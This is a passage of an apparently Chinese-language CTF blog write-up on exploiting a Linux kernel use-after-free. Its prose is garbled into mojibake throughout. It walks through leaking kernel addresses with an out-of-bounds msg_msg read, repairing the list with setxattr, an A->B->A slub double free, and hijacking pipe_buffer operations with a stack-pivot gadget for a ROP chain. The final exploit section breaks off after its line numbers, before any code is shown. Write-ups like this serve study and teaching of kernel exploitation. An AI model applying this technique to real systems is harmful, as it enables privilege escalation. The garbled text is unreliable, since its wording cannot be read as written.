å†…å­˜é¡µçš„å¤§å°ï¼‰ï¼Œä»è€Œè¶Šç•Œè¯»å‡ºå†…æ ¸å †ä¸Šæ•°æ®</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ€è€ƒå¦‚ä½•è¿›è¡Œâ€œåˆæ³•â€çš„æœç´¢ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹ <code>copy_msg</code> çš„é€»è¾‘ï¼Œå…¶æ‹·è´æ—¶åˆ¤æ–­å¾…æ•°æ®é•¿åº¦çš„é€»è¾‘<strong>ä¸»è¦æ˜¯çœ‹ next æŒ‡é’ˆ</strong>ï¼Œå› æ­¤è‹¥æˆ‘ä»¬çš„ next æŒ‡é’ˆä¸ºä¸€ä¸ªéæ³•åœ°å€ï¼Œåˆ™ä¼šåœ¨è§£å¼•ç”¨æ—¶å¯¼è‡´ kernel panic</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> msg_msg *<span class="title function_">copy_msg</span><span class="params">(<span class="keyword">struct</span> msg_msg *src, <span class="keyword">struct</span> msg_msg *dst)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">dst_pseg</span>, *<span class="title">src_pseg</span>;</span></span><br><span class="line"><span class="type">size_t</span> len = src-&gt;m_ts;</span><br><span class="line"><span class="type">size_t</span> alen;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (src-&gt;m_ts &gt; dst-&gt;m_ts)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">alen = min(len, DATALEN_MSG);</span><br><span class="line"><span class="built_in">memcpy</span>(dst + <span class="number">1</span>, src + <span class="number">1</span>, alen);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (dst_pseg = dst-&gt;next, src_pseg = src-&gt;next;</span><br><span class="line">     src_pseg != <span class="literal">NULL</span>;</span><br><span class="line">     dst_pseg = dst_pseg-&gt;next, src_pseg = src_pseg-&gt;next) &#123;</span><br><span class="line"></span><br><span class="line">len -= alen;</span><br><span class="line">alen = min(len, DATALEN_SEG);</span><br><span class="line"><span class="built_in">memcpy</span>(dst_pseg + <span class="number">1</span>, src_pseg + <span class="number">1</span>, alen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dst-&gt;m_type = src-&gt;m_type;</span><br><span class="line">dst-&gt;m_ts = src-&gt;m_ts;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬éœ€è¦ç¡®ä¿<strong>è·å¾—ä¸€ä¸ªåˆæ³•çš„å †ä¸Šåœ°å€è¿›è¡Œæœç´¢çš„åŒæ—¶</strong>ç¡®ä¿æˆ‘ä»¬æ‰€æ„é€ çš„<strong>next é“¾ä¸Šçš†ä¸ºåˆæ³•åœ°å€ï¼Œå¹¶ä»¥ NULL ç»“å°¾</strong>ï¼Œå¦‚ä½•æ‰¾åˆ°è¿™æ ·ä¸€ä¸ªåœ°å€ï¼Ÿ</p><p>æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œslub ä¼šå‘ buddy system ç”³è¯·ä¸€å¼ æˆ–å¤šå¼ è¿ç»­å†…å­˜é¡µï¼Œå°†å…¶åˆ†å‰²ä¸ºæŒ‡å®šå¤§å°çš„ object ä¹‹åå†è¿”è¿˜ç»™ kmalloc çš„ callerï¼Œå¯¹äºå¤§å°ä¸º 1024 çš„ objectï¼Œå…¶æ¯æ¬¡ç”³è¯·çš„è¿ç»­å†…å­˜é¡µä¸ºå››å¼ ï¼Œåˆ†ä¸º 16 ä¸ª object</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">cat</span> /proc/sla</span> </span><br><span class="line">Password: </span><br><span class="line">slabinfo - version: 2.1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">name            &lt;active_objs&gt; &lt;num_objs&gt; &lt;objsize&gt; &lt;objperslab&gt; &lt;pagesperslab&gt; : tunables &lt;<span class="built_in">limit</span>&gt; &lt;batchcount&gt; &lt;sharedfactor&gt; : slabdata &lt;active_slabs&gt; &lt;num_slabs&gt; &lt;sharedavail&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">...</span></span><br><span class="line">kmalloc-1k          3341   3584   1024   16    4 : tunables    0    0    0 : slabdata    224    224      0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">...</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œè‹¥æ˜¯æˆ‘ä»¬<strong>åˆ†é…å¤šä¸ªå¤§å°åŒä¸º 1024 çš„ msg_msg ç»“æ„ä½“ï¼Œåˆ™å…¶å¾ˆå®¹æ˜“è½åœ¨åœ°å€è¿ç»­çš„ 4 å¼ å†…å­˜é¡µä¸Š</strong>ï¼Œæ­¤æ—¶è‹¥æ˜¯æˆ‘ä»¬ä»å…¶ä¸­ä¸€ä¸ª msg_msg ç»“æ„ä½“å‘åè¿›è¡Œè¶Šç•Œè¯»ï¼Œ<strong>åˆ™å¾ˆå®¹æ˜“è¯»å–åˆ°å…¶ä»–çš„ msg_msg ç»“æ„ä½“çš„æ•°æ®</strong>ï¼Œå…¶ m_list æˆå‘˜å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ³„éœ²å‡ºä¸€ä¸ªå †ä¸Šåœ°å€</p><p>é‚£ä¹ˆè¿™ä¸ªå †ä¸Šåœ°å€æŒ‡å‘å“ªå‘¢ï¼Ÿè®©æˆ‘ä»¬å°†ç›®å…‰é‡æ–°æ”¾å› <code>msg_queue</code> ä¸ <code>msg_msg</code> ç»“æ„ä½“ä¹‹é—´çš„å…³ç³»ï¼Œå½“ä¸€ä¸ªæ¶ˆæ¯ä¸Šåªæœ‰ä¸€ä¸ª message æ—¶ï¼Œæˆ‘ä»¬ä¸éš¾çœ‹å‡º msg_msg çš„ prev ä¸ next æŒ‡é’ˆéƒ½æŒ‡å‘ msg_queue çš„ <code>q_messages</code> åŸŸï¼Œå¯¹åº”åœ°ï¼Œ msg_queue-&gt;q_message çš„ prev ä¸ next ä¹ŸåŒæ ·æŒ‡å‘ msg_msg çš„ <code>m_list</code> åŸŸ</p><p><img src="https://s2.loli.net/2022/02/24/sD9xtpaHrQ2uneZ.png" alt="image.png"></p><p>æ­¤æ—¶æˆ‘ä»¬ä¸éš¾æƒ³åˆ°ï¼Œ<strong>æˆ‘ä»¬å¯ä»¥å°† msg_msg çš„ next æŒ‡é’ˆæŒ‡å› msg_queueï¼Œä»è€Œè¯»å‡ºä¸Šé¢çš„æŒ‡å‘ msg_msg çš„æŒ‡é’ˆï¼Œå°†æœªçŸ¥çš„åœ°å€å˜ä¸ºå·²çŸ¥çš„åœ°å€</strong>ï¼Œä¹‹åæˆ‘ä»¬åœ¨æœç´¢æ—¶ä¾¿å¯ä»¥é€‰æ‹©ä»è¯¥åœ°å€å¼€å§‹æœç´¢ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½çŸ¥é“æ¯æ¬¡æœç´¢æ—¶è·å¾—çš„æ¯ä¸€æ¡æ•°æ®çš„åœ°å€ï¼Œ<strong>ä»è€Œåœ¨æ¯æ¬¡æœç´¢æ—¶èƒ½å¤ŸæŒ‘é€‰å·²çŸ¥æ•°æ®ä¸º NULL çš„åŒºåŸŸä½œä¸º next-&gt;next ä»¥é¿å… kernel panic</strong>ï¼Œä»¥æ­¤è·å¾—è¿ç»­çš„æœç´¢å†…å­˜çš„èƒ½åŠ›</p><p>ä½†æ˜¯è¿™æœ‰ä¸€ä¸ªå°è¦æ±‚ï¼Œæˆ‘ä»¬åœ¨æ³„éœ² msg_msg åœ°å€æ—¶åº”å½“é€‰å– msg_queue-&gt;q_message å¾€å‰çš„ä¸€å—ä¸º NULL çš„åŒºåŸŸä½œä¸º msg_msg-&gt;nextï¼Œä¸è¿‡ä»¤ç¬”è€…æ¬£å–œçš„æ˜¯ï¼Œ<code>msg_queue-&gt;q_lrpid</code> åœ¨æœªä½¿ç”¨ msgrcv æ¥æ”¶æ¶ˆæ¯æ—¶<strong>ä¸º NULL</strong>ï¼Œè¯¥æˆå‘˜åœ¨ q_message æˆå‘˜å‘å‰çš„ 8 å­—èŠ‚å¤„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°† next æŒ‡é’ˆæŒ‡å‘è¿™ä¸ªä½ç½®</p><p><img src="https://s2.loli.net/2022/02/25/5fOESRbu6Zan7mU.png" alt="image.png"></p><p>æ³„éœ²å‡º msg_msg çš„åœ°å€ä¹‹åå°±å¯ä»¥å¼€å§‹æ„‰å¿«çš„å†…å­˜æœç´¢äº†ï¼Œè‡³äºåœ¨æ³„éœ²å‡ºå†…æ ¸ä»£ç æ®µä¸ŠæŒ‡é’ˆåå¦‚ä½•è®¡ç®—å‡ºå†…æ ¸ä»£ç æ®µåŸºå€ï¼Œç¬”è€…è¿™é‡Œçš„åšæ³•æ¯”è¾ƒç¬¨ï¼šå°†ç»å¸¸å‡ºç°çš„å†…æ ¸æŒ‡é’ˆåšæˆä¸€ä¸ªå­—å…¸ï¼Œä¹‹åç›´æ¥ query å³å¯ï¼Œè‹¥å­—å…¸æœªå‘½ä¸­åˆ™ç»§ç»­æœç´¢</p><blockquote><p>å¯èƒ½æœ‰çš„äººä¼šæƒ³åˆ°ä¸€ä¸ªæ›´ä¸ºå¿«æ·çš„åŠæ³•ï¼šå› ä¸ºæˆ‘ä»¬å·²ç»è·å¾—äº†å†…æ ¸çš„â€œå †ä¸Šåœ°å€â€ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»çŒœæµ‹â€œå †çš„åŸºå€â€ï¼ˆ<code>page_offset_base</code>ï¼‰ï¼Œåœ¨ <code>page_offset_base + 0x9d000</code> å¤„<strong>å›ºå®šå­˜æ”¾ç€</strong> <code>secondary_startup_64</code> å‡½æ•°çš„åœ°å€ï¼Œè€Œè¿™ä¸ªåœ°å€å‰é¢åˆšå¥½æœ‰ä¸€ç‰‡ä¸º 0 çš„åŒºåŸŸæ–¹ä¾¿æˆ‘ä»¬çš„ next æŒ‡é’ˆè¿›è¡ŒæŒ‡å‘</p><p>ä½†è¿™ä¸ªåšæ³•æœ‰ä¸€å®šçš„é£é™©ï¼šè‹¥æ˜¯æˆ‘ä»¬çŒœé”™äº†åˆ™å¾ˆå®¹æ˜“å¯¼è‡´ kernel panicï¼Œä¸”ç»ç¬”è€…å°è¯•ä¼šåœ¨æˆ‘ä»¬çš„ä¸‹ä¸€æ­¥ä¸­<strong>å¯¼è‡´ kernel panic</strong>ï¼ˆä¹Ÿå¯èƒ½æ˜¯ç¬”è€…çš„æ„é€ å­˜åœ¨ç¼ºé™·ï¼‰ï¼Œæ‰€ä»¥ç¬”è€…è¿˜æ˜¯æ›´æ¨èå¤§å®¶åªç”¨å†…å­˜æœç´¢çš„åŠæ³•</p></blockquote><h3 id="Step-III-æ„é€ -A-gt-B-gt-A-å¼-freelist-åŠ«æŒæ–°çš„ç»“æ„ä½“"><a href="#Step-III-æ„é€ -A-gt-B-gt-A-å¼-freelist-åŠ«æŒæ–°çš„ç»“æ„ä½“" class="headerlink" title="Step.III æ„é€  A-&gt;B-&gt;A å¼ freelist åŠ«æŒæ–°çš„ç»“æ„ä½“"></a>Step.III æ„é€  A-&gt;B-&gt;A å¼ freelist åŠ«æŒæ–°çš„ç»“æ„ä½“</h3><p>ç°åœ¨åœ°å€æ³„éœ²çš„å·¥ä½œå·²ç»å®Œæˆäº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬æ¥è€ƒè™‘å¦‚ä½•è¿›è¡Œææƒï¼Œæ¯”è¾ƒæœ´ç´ çš„ææƒæ–¹æ³•æœ‰ä¸¤ç§ï¼šä¿®æ”¹è¿›ç¨‹ cred ç»“æ„ä½“æˆ–æ˜¯åŠ«æŒå†…æ ¸æ‰§è¡Œæµ</p><p>å¯¹äºå‰ä¸€ç§æ–¹æ³•æˆ‘ä»¬éœ€è¦è·å¾—å†…æ ¸ä¸­çš„ä»»æ„åœ°å€å†™ï¼Œå¯èƒ½æ­¤æ—¶æœ‰çš„åŒå­¦å·²ç»æƒ³åˆ°äº†åˆ©ç”¨ userfaultfd + msg_msg è¿™ä¸€ä»»æ„å†™æ–¹æ³•ï¼Œè€Œç°åœ¨æˆ‘ä»¬æœ‰ç€å†…å­˜æœç´¢æŠ€æœ¯ï¼Œè‡ªç„¶å¯ä»¥ç›´æ¥ä½¿ç”¨ prctl è®¾ç½® task_struct çš„ comm æˆå‘˜åè¿›è¡Œæš´åŠ›æœç´¢ï¼Œä½†é¦–å…ˆ<strong>æˆ‘ä»¬å¹¶ä¸çŸ¥é“ PCB åœ°å€åœ¨å½“å‰å·²çŸ¥å †åœ°å€çš„å‰æ–¹è¿˜æ˜¯åæ–¹</strong>ï¼Œæ— è®ºæœç´¢å‰å‘è¶Šç•Œè¿˜æ˜¯åå‘è¶Šç•Œåˆ°äº†éæ³•åœ°å€éƒ½ä¼šå¼•èµ· kernel panicï¼Œä¸”è‡ªå†…æ ¸ç‰ˆæœ¬ 5.11 èµ· <strong>userfaultfd ç³»ç»Ÿè°ƒç”¨è¢«é™åˆ¶ä¸º root æƒé™æ‰èƒ½ä½¿ç”¨</strong>ï¼Œå› æ­¤ç¬”è€…é€‰æ‹©æ§åˆ¶ä¸€äº›æœ‰ç€å‡½æ•°æŒ‡é’ˆçš„ç»“æ„ä½“ä»è€ŒåŠ«æŒå†…æ ¸æ‰§è¡Œæµ</p><p>é‚£ä¹ˆæˆ‘ä»¬è¦å°†è¯¥ object åˆ†é…åˆ°åˆ«çš„åœ°æ–¹ï¼Œè¿˜è¦èƒ½å¯¹å…¶è¿›è¡Œä¿®æ”¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬<strong>å¿…é¡»è¦å…ˆå°†è¯¥ object æ”¾å› slub ä¸­</strong>ï¼Œå› ä¸ºæ­¤æ—¶è¯¥ object è™½ä¸º free çŠ¶æ€ï¼Œä½†å½“æˆ‘ä»¬å°†å…¶åˆ†é…åˆ°åˆ«çš„ç»“æ„ä½“ä¸Šå<strong>æˆ‘ä»¬ä¾¿æ— æ³•å†æ§åˆ¶å…¶å†…å®¹</strong>ï¼Œå› ä¸ºæ­¤æ—¶åŸ msg_msg ç»“æ„ä½“çš„æ•°æ®ä¼šè¢«æ–°ç»“æ„ä½“è¦†ç›–ï¼Œ<strong>æ— æ³•æ­£å¸¸è¢«é‡Šæ”¾</strong>ï¼ˆè¿‡ä¸äº† msgrcv ä¸­çš„ unlinkï¼‰</p><p>å› æ­¤æ¥ä¸‹æ¥æˆ‘ä»¬çš„å·¥ä½œä¾¿æ˜¯å…ˆç»´ä¿® msg_msg ä¸­çš„åŒå‘é“¾è¡¨ï¼Œè®©å…¶æŒ‡å‘å†…æ ¸å †ä¸Šä¸€ä¸ªåˆæ³•çš„åœ°å€ï¼ŒåŒæ—¶è®© next æŒ‡é’ˆä¸º NULL å³å¯ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é€‰æ‹©ä½¿ç”¨ setxattr å®Œæˆä¿®å¤ï¼Œå¯èƒ½æœ‰çš„åŒå­¦è¿™é‡Œä¼šæœ‰ç–‘é—®ï¼šm_list æˆå‘˜ä½äº msg_msg çš„å‰ 16 å­—èŠ‚ï¼Œåœ¨ setxattr å°†å…¶æ”¾å› slub æ—¶<strong>éš¾é“ä¸ä¼šåˆå°†å…¶ä¿®æ”¹ä¸ºä¸€ä¸ª slub ä¸­çš„æŒ‡é’ˆä»è€Œç ´ååŒå‘é“¾è¡¨ä¹ˆ</strong>ï¼Ÿå¼€å¯äº† hardened freelist ä¿æŠ¤æ—¶ free object çš„ next æŒ‡é’ˆå­—é¢é‡å¹¶éä¸€ä¸ªåˆæ³•åœ°å€ã€‚è¿™é‡Œæˆ‘ä»¬å°±è¦è¯´åˆ° slub çš„ä¸€ä¸ªç‰¹æ€§äº†ï¼š</p><ul><li>ä¸åŒäº glibc ä¸­ç©ºé—²å †å—å›ºå®šä½¿ç”¨å‰ 8 å­—èŠ‚çš„ç»„ç»‡æ–¹å¼ï¼Œåœ¨ slub ä¸­ç©ºé—²çš„ object åœ¨å…¶å¯¹åº”çš„ kmem_cache-&gt;offset å¤„å­˜æ”¾ä¸‹ä¸€ä¸ª free object çš„æŒ‡é’ˆï¼ˆå¼€å¯äº† hardened freelist ä¿æŠ¤æ—¶è¯¥å€¼ä¸ºå½“å‰ object ä¸ ä¸‹ä¸€ä¸ª object åœ°å€å†ä¸ä¸€ä¸ª random å€¼æ€»å…±ä¸‰ä¸ªå€¼è¿›è¡Œå¼‚æˆ–çš„ç»“æœï¼‰</li></ul><p>ç»ç¬”è€…å¤šæ¬¡æµ‹è¯•ï¼Œå¯¹äºè¿™ç§è¾ƒå¤§çš„ object è€Œè¨€ï¼Œå…¶ offset é€šå¸¸ä¼šå¤§äº msg_msg header çš„å¤§å°ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è¿›è¡Œå®Œç¾ä¿®å¤</p><p>ä¿®å¤å®Œæˆä¹‹åæˆ‘ä»¬è€ƒè™‘å¦‚ä½•è¿›è¡Œ double freeï¼Œå› ä¸º slub çš„é‡Šæ”¾å‡½æ•°å¹¶æ²¡æœ‰å¤ªå¤šçš„ä¿æŠ¤ï¼Œå¦‚åŒ glibc ä¸­çš„ fastbin ä¸€èˆ¬åªä¼šæ£€æŸ¥ freelist ä¸Šçš„ç¬¬ä¸€ä¸ª objectï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦åƒåšç”¨æˆ·æ€ pwn é¢˜é‚£æ ·æ„é€  A-&gt;B-&gt;A çš„é‡Šæ”¾é“¾ä¾¿èƒ½å°† UAF å†åº”ç”¨åˆ°å…¶ä»–å†…æ ¸ç»“æ„ä½“ä¸Š</p><h3 id="Step-IV-pipe-buffer-åŠ«æŒ-RIP"><a href="#Step-IV-pipe-buffer-åŠ«æŒ-RIP" class="headerlink" title="Step.IV pipe_buffer åŠ«æŒ RIP"></a>Step.IV pipe_buffer åŠ«æŒ RIP</h3><p>æœ€åæˆ‘ä»¬æ¥æŒ‘é€‰ä¸€ä¸ªå†…æ ¸ç»“æ„ä½“æ¥åŠ«æŒ RIPï¼Œè¿™é‡Œç¬”è€…é€‰æ‹©äº† <code>pipe_buffer</code> è¿™ä¸€ç»“æ„ä½“ï¼Œå½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç®¡é“æ—¶ï¼Œåœ¨å†…æ ¸ä¸­ä¼šç”Ÿæˆæ•°ä¸ªè¿ç»­çš„è¯¥ç»“æ„ä½“ï¼Œç”³è¯·çš„å†…å­˜æ€»å¤§å°åˆšå¥½ä¼šè®©å†…æ ¸ä» kmalloc-1k ä¸­å–å‡ºä¸€ä¸ª object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è€Œå½“æˆ‘ä»¬å…³é—­äº†ç®¡é“çš„ä¸¤ç«¯æ—¶ï¼Œä¼šè§¦å‘ <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> è¿™ä¸€æŒ‡é’ˆï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦åŠ«æŒå…¶å‡½æ•°è¡¨å³å¯ï¼ŒåŠ«æŒçš„ä½ç½®ä¹Ÿå¾ˆæ¸…æ™°ï¼šå‰é¢æˆ‘ä»¬åœ¨æœç´¢å†…å­˜æ—¶è·å–åˆ°äº†å…¶ä¸­ä¸€ä¸ª msg_msg çš„åœ°å€ï¼Œåªéœ€è¦å‡å»å…¶ä¸è¢«ç”¨äº UAF çš„ object çš„åœ°å€ä¹‹é—´çš„åç§»å³å¯ï¼Œè¿™ä¸ªåç§»å€¼åœ¨æœç´¢è¿‡ç¨‹ä¸­æ˜¯å¯ä»¥è®¡ç®—å‡ºæ¥çš„</p><p>ä¹‹åæˆ‘ä»¬å°†å‡½æ•°è¡¨åŠ«æŒåˆ° pipe_buffer æ‰€å¤„ object ä¸Šï¼Œåœ¨è¯¥ object ä¸Šå¸ƒç½®å¥½ ROP é“¾ï¼Œå†é€‰ä¸€æ¡åˆé€‚çš„ç”¨äºæ ˆè¿ç§»çš„ gadget å³å¯</p><p>ç»ç¬”è€…å®æµ‹ï¼Œæ­¤æ—¶çš„ rsi å¯„å­˜å™¨æŒ‡å‘ pipe_bufferï¼Œå› æ­¤ç¬”è€…é€‰æ‹©äº†ä¸€æ¡ <code>push rsi ; pop rsp ; pop 4 vals ; ret</code> çš„ gadget å®Œæˆæ ˆè¿ç§»</p><p><img src="https://s2.loli.net/2022/02/25/daklBHtIYCs3K6q.png" alt="image.png"></p><h3 id="FINAL-EXPLOIT"><a href="#FINAL-EXPLOIT" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span 